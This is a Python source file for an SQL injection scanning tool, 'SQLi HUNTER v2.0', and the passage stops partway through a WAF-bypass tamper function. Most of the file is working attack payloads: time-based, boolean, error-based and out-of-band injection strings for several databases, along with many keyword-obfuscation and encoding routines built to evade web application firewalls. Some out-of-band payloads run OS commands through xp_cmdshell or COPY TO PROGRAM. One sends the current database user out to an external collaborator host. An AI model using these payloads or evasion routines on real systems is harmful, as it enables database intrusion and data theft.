#!/usr/bin/env python3
# =============================================================================
# SQLi HUNTER  v2.0
# Comprehensive SQL injection triage -- headers, query params, POST body,
# JSON body, cookies -- across every surface in one pass.
#
#   Detection channels (all surfaces):
#     TIME-BASED  : per-URL baseline -> SLEEP probe -> zero-delay control ->
#                   linear-scaling confirm -> re-verify. Adaptive to jitter.
#     BOOL-BASED  : true/false payload pair -> body length / status diff.
#                   Fast (no sleep), surfaces candidates quickly.
#     ERROR-BASED : ' vs '' status/length diff.
#     OOB         : DNS/HTTP callouts for async sinks -> your collaborator.
#
#   Surfaces tested:
#     - Request headers  (User-Agent, Referer, X-Forwarded-For + full set)
#     - URL query parameters (?key=value)
#     - POST form fields  (application/x-www-form-urlencoded)
#     - POST JSON values  (application/json)
#     - Cookie values     (opt-in: --test-cookies)
#     - HTML form fields  (opt-in: --discover-forms, fetches + parses page)
#
#   Output: sqlmap-ready raw request (-r) with * marker per finding,
#           written incrementally. bash sqlmap_commands.sh is a cheat-sheet
#           -- review and run lines individually, not as a batch.
#
#   Engagement safety rails:
#     --passive-harvest, --no-post, --rate, --skip-404,
#     --respect-hours, --scope, --urls-only
#
#   AUTHORIZED TESTING ONLY. By Clark Voss
# =============================================================================

import argparse
import asyncio
import csv
import json
import os
import random
import re
import shutil
import subprocess
import sys
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field, asdict
from datetime import datetime
from html.parser import HTMLParser
from statistics import median
from urllib.parse import (urlsplit, urljoin, parse_qs, urlencode,
                          quote_plus, unquote_plus)

try:
    import httpx
except ImportError:
    sys.exit("[!] Missing dependency:  pip install httpx")

# --------------------------------------------------------------------------- #
# Colors
# --------------------------------------------------------------------------- #
_TTY = sys.stdout.isatty()
def _c(code): return code if _TTY else ""
RED, GRN, YEL, BLU, MAG, CYN, WHT = (_c(f"\033[3{n}m") for n in range(1, 8))
BOLD, DIM, RST = _c("\033[1m"), _c("\033[2m"), _c("\033[0m")

def banner():
    if not _TTY:
        print("SQLi HUNTER v2.0"); return
    print(f"""{BOLD}{MAG}
  ___  ___  _    _   _  _  _  _ _  _ _____ ___ ___
 / __|/ _ \\| |  (_) | || || || | || |_   _| __| _ \\
 \\__ \\ (_) | |__ _  | __ || __ | || |_ | | | _||   /
 |___/\\__\\_\\____|_| |_||_||_||_|\\__/  |_| |___|_|_\\{RST}
   {BOLD}{CYN}v2.0{RST}  {DIM}headers * query * body * json * cookies -> sqlmap{RST}
   {DIM}authorized testing only{RST}
""")

# --------------------------------------------------------------------------- #
# Surface kinds
# --------------------------------------------------------------------------- #
SURF_HEADER    = "header"
SURF_QUERY     = "query"
SURF_BODY_FORM = "body_form"
SURF_BODY_JSON = "body_json"
SURF_COOKIE    = "cookie"

# Parameters to skip (CSRF tokens, non-injectable)
CSRF_NAMES = {
    "_token", "csrf_token", "csrftoken", "authenticity_token", "_csrf",
    "csrfmiddlewaretoken", "__requestverificationtoken", "xsrf_token",
    "_xsrf", "antiforgery", "__csrf_magic",
}
# Input types that are not injectable
SKIP_INPUT_TYPES = {"submit","button","image","reset","file","checkbox","radio"}

# --------------------------------------------------------------------------- #
# Static-asset filtering
# --------------------------------------------------------------------------- #
STATIC_EXT = {
    "jpg","jpeg","png","gif","svg","webp","bmp","ico","tif","tiff",
    "css","woff","woff2","ttf","eot","otf",
    "mp4","webm","mp3","wav","avi","mov","mkv","ogg","flv",
    "zip","tar","gz","rar","7z","bz2",
    "pdf","doc","docx","xls","xlsx","ppt","pptx",
    "map","js",
}
def is_static(url):
    tail = urlsplit(url).path.lower().rsplit("/",1)[-1]
    return "." in tail and tail.rsplit(".",1)[-1] in STATIC_EXT

def host_of(url):    return urlsplit(url).netloc.split("@")[-1]
def reg_domain(host):
    h = host.split(":")[0]
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", h): return h
    p = h.split(".")
    return ".".join(p[-2:]) if len(p) >= 2 else h
def sanitize(s):
    return "".join(ch if ch.isalnum() or ch in "._-" else "_" for ch in s)[:80]

# --------------------------------------------------------------------------- #
# Benign header values
# --------------------------------------------------------------------------- #
BENIGN = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
    "Referer":    "https://www.google.com/",
    "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "X-Requested-With": "XMLHttpRequest",
}
BENIGN_IP = "8.8.8.8"
IP_HEADERS = {"X-Forwarded-For","X-Real-IP","X-Client-IP","Client-IP",
              "True-Client-IP","CF-Connecting-IP","X-Originating-IP",
              "Forwarded","X-Forwarded-Host"}
DEFAULT_HEADERS = ["User-Agent","Referer","X-Forwarded-For"]
FULL_HEADERS = DEFAULT_HEADERS + ["X-Real-IP","X-Client-IP","Client-IP",
                                   "True-Client-IP","CF-Connecting-IP",
                                   "X-Originating-IP","X-Forwarded-Host"]
def benign_value(h):
    if h in BENIGN:    return BENIGN[h]
    if h in IP_HEADERS: return BENIGN_IP
    return BENIGN["User-Agent"]

# --------------------------------------------------------------------------- #
# Payloads
# --------------------------------------------------------------------------- #

# ---- Header time-based (append to benign value) ----
HDR_TIME = [
    ("mysql",    "sq",      "'XOR(SELECT(0)FROM(SELECT(SLEEP({d})))a)XOR'Z"),
    ("mysql",    "sq",      "'XOR(if(now()=sysdate(),sleep({d}),0))XOR'Z"),
    ("mysql",    "dq",      '"XOR(SELECT(0)FROM(SELECT(SLEEP({d})))a)XOR"Z'),
    ("mysql",    "unquoted","(SELECT(0)FROM(SELECT(SLEEP({d})))a)"),
    ("mysql",    "sq",      "' AND SLEEP({d})-- -"),
    ("mysql",    "sq",      "'||(SELECT SLEEP({d}))||'"),
    ("mssql",    "sq",      "' WAITFOR DELAY '0:0:{d}'-- -"),
    ("mssql",    "stacked", "';WAITFOR DELAY '0:0:{d}'-- -"),
    ("postgres", "sq",      "'||(SELECT ''x'' FROM PG_SLEEP({d}))||'"),
    ("postgres", "stacked", "';SELECT PG_SLEEP({d})-- -"),
    ("postgres", "sq",      "' AND 1=(SELECT 1 FROM PG_SLEEP({d}))-- -"),
    ("oracle",   "sq",      "'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(66),{d})||'"),
    # WAF-bypass variants (version comments, no-space, alternative syntax)
    ("mysql",    "vc",      "'/*!XOR*/(/*!SELECT*/(0)/*!FROM*/(/*!SELECT*/(/*!SLEEP*/({d})))a)/*!XOR*/'Z"),
    ("mysql",    "vc",      "'||(/*!SELECT*/ /*!SLEEP*/({d}))||'"),
    ("mssql",    "nl",      "' WAITFOR%0aDELAY%0a'0:0:{d}'--"),
    ("postgres", "vc",      "'/**/AND/**/1=(SELECT/**/1/**/FROM/**/PG_SLEEP({d}))--"),
    # ---- paren-close contexts (extremely common in real apps) ----
    ("mysql",    "paren1",  "') AND SLEEP({d})-- -"),
    ("mysql",    "paren2",  "')) AND SLEEP({d})-- -"),
    ("mysql",    "paren1",  "') OR SLEEP({d})-- -"),
    ("mssql",    "paren1",  "') WAITFOR DELAY '0:0:{d}'-- -"),
    ("mssql",    "paren2",  "')) WAITFOR DELAY '0:0:{d}'-- -"),
    ("postgres", "paren1",  "') AND PG_SLEEP({d})-- -"),
    ("postgres", "paren2",  "')) AND PG_SLEEP({d})-- -"),
    ("oracle",   "paren1",  "') AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66),{d})-- -"),
    # ---- OR forms (some WAFs/code paths pass OR but block AND) ----
    ("mysql",    "or-sq",   "' OR SLEEP({d})-- -"),
    ("postgres", "or-sq",   "' OR PG_SLEEP({d})-- -"),
    ("oracle",   "or-sq",   "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66),{d})-- -"),
    # ---- explicit IF / conditional forms ----
    ("mysql",    "if-sq",   "' AND IF(1=1,SLEEP({d}),0)-- -"),
    ("mysql",    "if-num",  " AND IF(1=1,SLEEP({d}),0)-- -"),
    ("mssql",    "if-sq",   "' IF(1=1) WAITFOR DELAY '0:0:{d}'-- -"),
    # ---- stacked query forms ----
    ("mysql",    "stacked", "'; SELECT SLEEP({d})-- -"),
    ("mssql",    "stacked", "'; IF(1=1) WAITFOR DELAY '0:0:{d}'-- -"),
    ("postgres", "stacked", "'; SELECT PG_SLEEP({d})-- -"),
    # ---- SQLite: RANDOMBLOB compute delay (no SLEEP in SQLite) ----
    ("sqlite",   "sq",      "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({d}0000000))))-- -"),
    ("sqlite",   "paren1",  "') AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({d}0000000))))-- -"),
    ("sqlite",   "num",     " AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({d}0000000))))-- -"),
]

# ---- Parameter time-based (replace value) ----
PARAM_TIME = [
    ("mysql",    "sq",      "' AND SLEEP({d})-- -"),
    ("mysql",    "sq",      "') AND SLEEP({d})-- -"),
    ("mysql",    "sq",      "' OR SLEEP({d})-- -"),
    ("mysql",    "sq",      "'XOR(SELECT(0)FROM(SELECT(SLEEP({d})))a)XOR'"),
    ("mysql",    "dq",      '" AND SLEEP({d})-- -'),
    ("mysql",    "num",     " AND SLEEP({d})-- -"),
    ("mysql",    "num",     " OR SLEEP({d})-- -"),
    ("mssql",    "sq",      "' WAITFOR DELAY '0:0:{d}'-- -"),
    ("mssql",    "sq",      "') WAITFOR DELAY '0:0:{d}'-- -"),
    ("mssql",    "stacked", "'; WAITFOR DELAY '0:0:{d}'-- -"),
    ("mssql",    "num",     " WAITFOR DELAY '0:0:{d}'-- -"),
    ("postgres", "sq",      "' AND PG_SLEEP({d})-- -"),
    ("postgres", "sq",      "') AND PG_SLEEP({d})-- -"),
    ("postgres", "stacked", "'; SELECT PG_SLEEP({d})-- -"),
    ("postgres", "num",     " AND 1=(SELECT 1 FROM PG_SLEEP({d}))-- -"),
    ("oracle",   "sq",      "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66),{d})-- -"),
    # WAF-bypass: version comments (MySQL), whitespace alternates, no-space variants
    ("mysql",    "vc",      "'/*!AND*//*!SLEEP*/({d})-- -"),
    ("mysql",    "vc",      "'AND(/*!SLEEP*/({d}))-- -"),
    ("mysql",    "tab",     "'%09AND%09SLEEP({d})%09-- -"),
    ("mysql",    "nl",      "'%0aAND%0aSLEEP({d})%0a-- -"),
    ("mysql",    "sci",     "'AND 1e0=1e0 AND SLEEP({d})-- -"),
    ("mssql",    "nl",      "'%0aWAITFOR%0aDELAY%0a'0:0:{d}'-- -"),
    ("mssql",    "comment", "' WAIT/**/FOR/**/DELAY/**/'0:0:{d}'-- -"),
    ("postgres", "tab",     "'%09AND%09PG_SLEEP({d})-- -"),
    # ---- paren-close contexts ----
    ("mysql",    "paren1",  "') AND SLEEP({d})-- -"),
    ("mysql",    "paren2",  "')) AND SLEEP({d})-- -"),
    ("mysql",    "paren3",  "'))) AND SLEEP({d})-- -"),
    ("mysql",    "paren1",  "') OR SLEEP({d})-- -"),
    ("mssql",    "paren1",  "') WAITFOR DELAY '0:0:{d}'-- -"),
    ("mssql",    "paren2",  "')) WAITFOR DELAY '0:0:{d}'-- -"),
    ("postgres", "paren1",  "') AND PG_SLEEP({d})-- -"),
    ("postgres", "paren2",  "')) AND PG_SLEEP({d})-- -"),
    ("oracle",   "paren1",  "') AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66),{d})-- -"),
    # ---- OR forms ----
    ("mysql",    "or-sq",   "' OR SLEEP({d})-- -"),
    ("mysql",    "or-num",  " OR SLEEP({d})-- -"),
    ("mssql",    "or-sq",   "' OR WAITFOR DELAY '0:0:{d}'-- -"),
    ("postgres", "or-sq",   "' OR PG_SLEEP({d})-- -"),
    ("postgres", "or-num",  " OR PG_SLEEP({d})-- -"),
    ("oracle",   "or-sq",   "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66),{d})-- -"),
    # ---- explicit IF/conditional ----
    ("mysql",    "if-sq",   "' AND IF(1=1,SLEEP({d}),0)-- -"),
    ("mysql",    "if-num",  " AND IF(1=1,SLEEP({d}),0)-- -"),
    ("mysql",    "if-paren","') AND IF(1=1,SLEEP({d}),0)-- -"),
    ("mssql",    "if-sq",   "' IF(1=1) WAITFOR DELAY '0:0:{d}'-- -"),
    # ---- stacked query forms ----
    ("mysql",    "stacked", "'; SELECT SLEEP({d})-- -"),
    ("mysql",    "stacked", "'; CALL SLEEP({d})-- -"),
    ("mssql",    "stacked", "'; IF(1=1) WAITFOR DELAY '0:0:{d}'-- -"),
    ("postgres", "stacked", "'; SELECT PG_SLEEP({d})-- -"),
    ("oracle",   "stacked", "'; BEGIN DBMS_LOCK.SLEEP({d}); END;-- -"),
    # ---- SQLite: RANDOMBLOB compute delay ----
    ("sqlite",   "sq",      "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({d}0000000))))-- -"),
    ("sqlite",   "paren1",  "') AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({d}0000000))))-- -"),
    ("sqlite",   "num",     " AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({d}0000000))))-- -"),
    ("sqlite",   "or-sq",   "' OR LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({d}0000000))))-- -"),
    # ---- subquery alternative (different AST, bypasses some parsers) ----
    ("mysql",    "subq",    "' AND (SELECT * FROM (SELECT(SLEEP({d})))a)-- -"),
    ("mysql",    "subq",    " AND (SELECT * FROM (SELECT(SLEEP({d})))a)-- -"),
]

# ---- Boolean-based pairs (true_tpl, false_tpl) -- fast, no sleep ----
# Only used for params (headers have no reliable boolean channel)
BOOL_PAIRS = [
    ("mysql",    "sq",  "' AND '1'='1",       "' AND '1'='2"),
    ("mysql",    "sq",  "' AND 1=1-- -",       "' AND 1=2-- -"),
    ("mysql",    "sq",  "') AND 1=1-- -",      "') AND 1=2-- -"),
    ("mysql",    "num", " AND 1=1-- -",         " AND 1=2-- -"),
    ("mysql",    "num", " AND 1=1",              " AND 1=2"),
    ("mssql",    "sq",  "' AND 1=1-- -",        "' AND 1=2-- -"),
    ("mssql",    "num", " AND 1=1-- -",          " AND 1=2-- -"),
    ("postgres", "sq",  "' AND 1=1-- -",        "' AND 1=2-- -"),
    ("postgres", "num", " AND 1=1-- -",          " AND 1=2-- -"),
    ("oracle",   "sq",  "' AND 1=1-- -",        "' AND 1=2-- -"),
    # ---- double-quote context (MySQL ANSI_QUOTES mode) ----
    ("mysql",    "dq",  '" AND "1"="1',          '" AND "1"="2'),
    ("mysql",    "dq",  '" AND 1=1-- -',          '" AND 1=2-- -'),
    ("mssql",    "dq",  '" AND "1"="1',           '" AND "1"="2'),
    # ---- paren-close context ----
    ("mysql",    "p1",  "') AND 1=1-- -",         "') AND 1=2-- -"),
    ("mysql",    "p1",  "') AND '1'='1",          "') AND '1'='2"),
    ("mssql",    "p1",  "') AND 1=1-- -",         "') AND 1=2-- -"),
    ("postgres", "p1",  "') AND 1=1-- -",         "') AND 1=2-- -"),
    ("oracle",   "p1",  "') AND 1=1-- -",         "') AND 1=2-- -"),
    # ---- NULL-based (bypasses WAFs blocking 1=1 / 1=2) ----
    ("mysql",    "null","' AND NULL IS NULL-- -",  "' AND NULL IS NOT NULL-- -"),
    ("mysql",    "null"," AND NULL IS NULL-- -",   " AND NULL IS NOT NULL-- -"),
    ("mssql",    "null","' AND NULL IS NULL-- -",  "' AND NULL IS NOT NULL-- -"),
    # ---- EXISTS-based (evades AND 1=1 pattern matching) ----
    ("mysql",    "ex",  "' AND EXISTS(SELECT 1)-- -",     "' AND NOT EXISTS(SELECT 1)-- -"),
    ("mysql",    "ex",  " AND EXISTS(SELECT 1)-- -",      " AND NOT EXISTS(SELECT 1)-- -"),
    ("mssql",    "ex",  "' AND EXISTS(SELECT 1)-- -",     "' AND NOT EXISTS(SELECT 1)-- -"),
    ("postgres", "ex",  "' AND EXISTS(SELECT 1)-- -",     "' AND NOT EXISTS(SELECT 1)-- -"),
    # ---- CASE WHEN (most WAF-agnostic boolean form) ----
    ("mysql",    "case","' AND CASE WHEN(1=1) THEN 1 ELSE 0 END=1-- -",
                        "' AND CASE WHEN(1=2) THEN 1 ELSE 0 END=1-- -"),
    ("mysql",    "case"," AND CASE WHEN(1=1) THEN 1 ELSE 0 END=1-- -",
                        " AND CASE WHEN(1=2) THEN 1 ELSE 0 END=1-- -"),
    ("mssql",    "case","' AND CASE WHEN(1=1) THEN 1 ELSE 0 END=1-- -",
                        "' AND CASE WHEN(1=2) THEN 1 ELSE 0 END=1-- -"),
    ("postgres", "case","' AND CASE WHEN(1=1) THEN 1 ELSE 0 END=1-- -",
                        "' AND CASE WHEN(1=2) THEN 1 ELSE 0 END=1-- -"),
    # ---- SQLite boolean ----
    ("sqlite",   "sq",  "' AND 1=1-- -",          "' AND 1=2-- -"),
    ("sqlite",   "p1",  "') AND 1=1-- -",         "') AND 1=2-- -"),
    ("sqlite",   "num", " AND 1=1-- -",            " AND 1=2-- -"),
]

# ---- OOB payloads (header) ----
HDR_OOB = [
    ("mssql",   "stacked", r"';EXEC master..xp_dirtree '\\{c}\x';-- -"),
    ("mssql",   "sq",      r"' EXEC master..xp_dirtree '\\{c}\x'-- -"),
    ("oracle",  "sq",      "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('{c}') FROM DUAL)||'"),
    ("oracle",  "sq",      "'||UTL_HTTP.REQUEST('http://{c}/')||'"),
    ("oracle",  "sq",      "'||DBMS_LDAP.INIT('{c}',80)||'"),
    ("postgres","stacked", "';COPY (SELECT 1) TO PROGRAM 'nslookup {c}'-- -"),
    ("postgres","sq",      "';SELECT dblink_connect('host={c} port=80 dbname=x user=x password=x')-- -"),
    ("mysql",   "sq",      r"' AND LOAD_FILE(CONCAT('\\',(SELECT HEX(CURRENT_USER())),'.{c}\a'))-- -"),
    ("mysql",   "sq",      r"' AND LOAD_FILE('\\{c}\a')-- -"),
]

# ---- OOB payloads (param) ----
PARAM_OOB = [
    ("mssql",   "stacked", r"'; EXEC master..xp_dirtree '\\{c}\x'-- -"),
    ("oracle",  "sq",      "' UNION SELECT UTL_HTTP.REQUEST('http://{c}') FROM DUAL-- -"),
    ("postgres","stacked", "'; COPY (SELECT 1) TO PROGRAM 'nslookup {c}'-- -"),
    ("mysql",   "sq",      r"' AND LOAD_FILE('\\{c}\a')-- -"),
    # MSSQL xp_cmdshell (when enabled)
    ("mssql",   "stacked", "'; EXEC xp_cmdshell('nslookup {c}')-- -"),
    # MySQL hex-encoded UNC (bypasses WAF string inspection)
    ("mysql",   "hex-unc", "' AND LOAD_FILE(CONCAT(0x5c5c5c5c,'{c}',0x5c61))-- -"),
    # Oracle autonomous TX HTTP callout
    ("oracle",  "sq-url",  "' AND 1=(SELECT UTL_HTTP.REQUEST('http://{c}/') FROM DUAL)-- -"),
]


# ---- Tamper ----
# ---- SQL error signatures (scan response body) ----
# IMPORTANT: Every entry must be specific enough that it cannot appear
# in normal page content. Generic English words like "Table", "syntax error",
# or "database error" cause false positives and MUST NOT be in this list.
# Each signature should be a string that only appears in genuine DB error output.
ERROR_SIGNATURES = [
    # ---- MySQL / MariaDB ----
    # These are the exact strings MySQL error messages contain:
    "You have an error in your SQL syntax",        # most reliable MySQL error
    "mysql_num_rows()", "mysql_fetch_array()",     # PHP MySQL function names
    "Warning: mysql_", "Warning: mysqli_",         # PHP warning prefix
    "MySQLSyntaxErrorException",                   # Java connector
    "XPATH syntax error",                          # EXTRACTVALUE / UPDATEXML result
    "supplied argument is not a valid MySQL",      # old PHP mysql extension
    "com.mysql.jdbc.exceptions",                   # Java MySQL connector
    "org.gjt.mm.mysql",                            # old MySQL JDBC
    # ---- MSSQL ----
    "Unclosed quotation mark after the character string",  # exact MSSQL error
    "Incorrect syntax near",                       # MSSQL parse error
    "Microsoft OLE DB Provider for SQL Server",    # MSSQL OLEDB provider string
    "ODBC SQL Server Driver",                      # MSSQL ODBC error header
    "SQLServer JDBC Driver",                       # MSSQL JDBC
    "com.microsoft.sqlserver",                     # MSSQL Java connector
    "Microsoft SQL Native Client",                 # MSSQL native client
    "Conversion failed when converting",           # CONVERT(INT,...) error text
    "SqlException",                                # .NET SQL exception class name
    # ---- PostgreSQL ----
    "PSQLException",                               # Java PG connector exception
    "org.postgresql.jdbc",                         # Java PG connector package
    "Warning: pg_query()",                         # PHP pg_query warning
    "ERROR: syntax error at or near",              # PG error prefix (specific)
    "ERROR: unterminated quoted string at or after",  # PG specific error
    "ERROR: invalid input syntax for type integer",   # PG CAST error
    "ERROR: operator does not exist",              # PG type mismatch
    # ---- Oracle ----
    "ORA-00907: missing right parenthesis",        # Oracle-specific ORA codes
    "ORA-00933: SQL command not properly ended",
    "ORA-00942: table or view does not exist",
    "ORA-01756: quoted string not properly terminated",
    "ORA-06512:",                                  # Oracle PL/SQL error
    "oracle.jdbc.driver",                          # Oracle JDBC driver package
    "oracle.net.ns",                               # Oracle Net namespace
    # ---- SQLite ----
    "SQLiteException",                             # SQLite exception class
    "System.Data.SQLite",                          # .NET SQLite
    "[SQLITE_ERROR] SQL logic error",              # SQLite full error string
    # ---- Generic JDBC / ODBC (specific enough) ----
    "java.sql.SQLException",                       # Java SQL base exception
    "Syntax error in string in query expression",  # MS Access specific
    "An Expression of non-boolean type specified in a context where a condition",
    "ODBC Microsoft Access Driver",                # MS Access ODBC
    "com.mysql.cj.jdbc",                           # MySQL Connector/J 8+
    "org.apache.derby",                            # Apache Derby
    "org.hsqldb",                                  # HyperSQL
    "PDOException: SQLSTATE",                      # PHP PDO with SQLSTATE
]

# ---- Active error-based payloads (provoke visible DB errors) ----
ACTIVE_ERROR_PAYLOADS = [
    # MySQL: EXTRACTVALUE causes XPath error with data in it
    ("mysql",    "sq",   "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1)))-- -"),
    ("mysql",    "num",  " AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1)))-- -"),
    ("mysql",    "p1",   "') AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1)))-- -"),
    # MySQL: UPDATEXML
    ("mysql",    "sq",   "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT 1)),1)-- -"),
    ("mysql",    "num",  " AND UPDATEXML(1,CONCAT(0x7e,(SELECT 1)),1)-- -"),
    # MySQL: floor(rand()) group by duplicate key
    ("mysql",    "sq",   "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"),
    # MSSQL: type conversion error
    ("mssql",    "sq",   "' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.databases))-- -"),
    ("mssql",    "num",  " AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.databases))-- -"),
    ("mssql",    "p1",   "') AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.databases))-- -"),
    # MSSQL: implicit conversion
    ("mssql",    "sq",   "' AND 1 IN (SELECT TOP 1 CAST(name AS INT) FROM sys.databases)-- -"),
    # PostgreSQL: CAST type mismatch
    ("postgres", "sq",   "' AND 1=CAST((SELECT 1) AS INT)-- -"),
    ("postgres", "num",  " AND 1=CAST((SELECT 1) AS INT)-- -"),
    # PostgreSQL: interval overflow  
    ("postgres", "sq",   "' AND 1=(SELECT 1 FROM generate_series(1,1) WHERE 1=CAST((SELECT 1) AS INT))-- -"),
    # Oracle: invalid number conversion
    ("oracle",   "sq",   "' AND 1=TO_NUMBER((SELECT 1 FROM DUAL))-- -"),
    ("oracle",   "p1",   "') AND 1=TO_NUMBER((SELECT 1 FROM DUAL))-- -"),
    # SQLite: division by zero
    ("sqlite",   "sq",   "' AND 1=1/0-- -"),
    ("sqlite",   "num",  " AND 1=1/0-- -"),
]

_KW = ["SELECT","SLEEP","WAITFOR","DELAY","PG_SLEEP","UNION","XOR","AND","OR",
       "FROM","WHERE","IF","NOW","SYSDATE","EXEC","LOAD_FILE","CONCAT","INSERT",
       "BETWEEN","GREATEST","IFNULL","ISNULL","NULLIF","COALESCE"]

def _mixcase(s):
    """Alternate upper/lower on every keyword character."""
    def rep(m):
        return "".join(ch.upper() if i%2 else ch.lower()
                       for i, ch in enumerate(m.group()))
    for k in _KW:
        s = re.sub(k, rep, s, flags=re.I)
    return s

def _space2comment(s):       return s.replace(" ","/**/")
def _space2tab(s):           return s.replace(" ","%09")
def _space2newline(s):       return s.replace(" ","%0a")
def _space2hash_newline(s):  return s.replace(" ","%23%0a")  # comment + newline

def _mysql_version_comment(s):
    """Wrap keywords in /*!50000 ... */ -- MySQL executes, many WAFs skip."""
    for k in sorted(_KW, key=len, reverse=True):
        s = re.sub(r'(?i)\b' + k + r'\b',
                   lambda m: f"/*!50000{m.group().upper()}*/", s)
    return s

def _mysql_inline_bang(s):
    """Minimal /*!...*/ around just the function call portion."""
    # e.g. SLEEP(5) -> /*!SLEEP*/(5)
    s = re.sub(r'(?i)\bSLEEP\s*\(', '/*!SLEEP*/(', s)
    s = re.sub(r'(?i)\bPG_SLEEP\s*\(', '/*!PG_SLEEP*/(', s)
    return s

def _keyword_split(s):
    """Break keywords with inline comment: SLEEP -> SL/**/EEP."""
    for k in sorted(_KW, key=len, reverse=True):
        if len(k) < 4: continue
        mid   = len(k) // 2
        split = k[:mid] + "/**/" + k[mid:]
        s = re.sub(r'(?i)\b' + k + r'\b', split, s)
    return s

def _urlencode_sql(s):
    """URL-encode critical SQL punctuation chars."""
    tbl = {
        chr(39): "%27", chr(34): "%22", " ": "%20",
        "(": "%28", ")": "%29", "=": "%3d",
        "#": "%23", ";": "%3b", "*": "%2a",
    }
    return "".join(tbl.get(c, c) for c in s)
def _dbl_urlencode(s):
    """Double-encode the % from a first pass -- hits WAFs that decode once."""
    return _urlencode_sql(s).replace("%","%25")

def _scientific_sep(s):
    """Replace a leading digit space before UNION with scientific notation."""
    # 1 UNION -> 1e0UNION  (no space needed, MySQL parses 1e0 as 1.0)
    s = re.sub(r'(?i)(\d)\s+UNION', r'\g<1>e0UNION', s)
    return s

def _pg_dollar_quote(s):
    """PostgreSQL dollar-quoting: swap single-quotes for dollar-dollar (PG string context)."""
    return s.replace(chr(39), '$$')

def _between_replace(s):
    """Replace numeric equality with BETWEEN for evasion.
    1=1 -> 1 BETWEEN 1 AND 1  (logically equivalent true)
    1=2 -> 1 BETWEEN 2 AND 2  (false)
    """
    s = re.sub(r'(?i)\b1=1\b', '1 BETWEEN 1 AND 1', s)
    s = re.sub(r'(?i)\b1=2\b', '1 BETWEEN 2 AND 2', s)
    return s

# ---- tamper level sets ----
# Level 1: fast, low-noise -- catches basic WAF keyword matching
_LEVEL1 = [_space2comment, _mixcase]
# Level 2: + MySQL version comments, whitespace alternates, case combos
_LEVEL2 = _LEVEL1 + [_mysql_version_comment, _mysql_inline_bang,
                      _space2tab, _space2newline, _space2hash_newline]
# Level 3: + keyword splitting, URL encoding, scientific notation
_LEVEL3 = _LEVEL2 + [_keyword_split, _urlencode_sql, _scientific_sep]


# ---- Additional tamper functions (sqlmap-compatible set) ----

def _space2dash(s):
    """MySQL: space -> --<random6chars>\n (comment flush)."""
    import random as _r, string as _st
    rnd = ''.join(_r.choices(_st.ascii_lowercase, k=6))
    return s.replace(' ', f'--{rnd}\n')

def _space2hash(s):
    """MySQL: space -> #<random6chars>\n (hash comment + newline)."""
    import random as _r, string as _st
    rnd = ''.join(_r.choices(_st.ascii_lowercase, k=6))
    return s.replace(' ', f'#{rnd}\n')

def _space2plus(s):
    """URL query context: space -> + ."""
    return s.replace(' ', '+')

def _space2mssqlblank(s):
    """MSSQL: replace space with a random T-SQL-valid control char."""
    import random as _r
    blanks = ['%01','%02','%03','%04','%05','%06','%07','%08',
              '%0b','%0c','%0d','%0e','%0f','%0a']
    return ''.join(_r.choice(blanks) if c == ' ' else c for c in s)

def _space2mysqdash(s):
    """MySQL: space -> --+-\n ."""
    return s.replace(' ', '--+-\n')

def _space2morecomment(s):
    """space -> /**_**/  (harder for simple WAF patterns to match)."""
    return s.replace(' ', '/**_**/')

def _space2randomblank(s):
    """Replace space with random whitespace: tab / CR / LF / VT / FF."""
    import random as _r
    blanks = ['\t', '\r', '\n', '\x0b', '\x0c']
    return ''.join(_r.choice(blanks) if c == ' ' else c for c in s)

def _multiplespaces(s):
    """Add multiple spaces around each SQL keyword to confuse tokenizers."""
    for k in sorted(_KW, key=len, reverse=True):
        s = re.sub(r'(?i)\b' + k + r'\b', '   ' + k + '   ', s)
    return s

def _randomcomments(s):
    """Insert /**/ between every character of SQL keywords: SELECT->S/**/E/**/L..."""
    def _between(m):
        return '/**/'.join(list(m.group()))
    for k in sorted(_KW, key=len, reverse=True):
        s = re.sub(r'(?i)\b' + k + r'\b', _between, s)
    return s

def _commentbeforeparentheses(s):
    """Prepend inline comment before every opening paren: SLEEP(5)->SLEEP/**/(5)."""
    return s.replace('(', '/**/(')

def _versionedkeywords(s):
    """Wrap each keyword in lightweight /*!KEYWORD*/ (no version number)."""
    for k in sorted(_KW, key=len, reverse=True):
        s = re.sub(r'(?i)\b' + k + r'\b',
                   lambda m: '/*!{}*/'.format(m.group().upper()), s)
    return s

def _versionedmorekeywords(s):
    """Per-keyword /*!50000KEYWORD*/ (more keywords than versioncomment)."""
    for k in sorted(_KW, key=len, reverse=True):
        s = re.sub(r'(?i)\b' + k + r'\b',
                   lambda m: '/*!50000{}*/'.format(m.group().upper()), s)
    return s

def _modsecurityzeroversioned(s):
    """/*!0KEYWORD*/ -- zero-versioned, specific ModSecurity bypass."""
    for k in sorted(_KW, key=len, reverse=True):
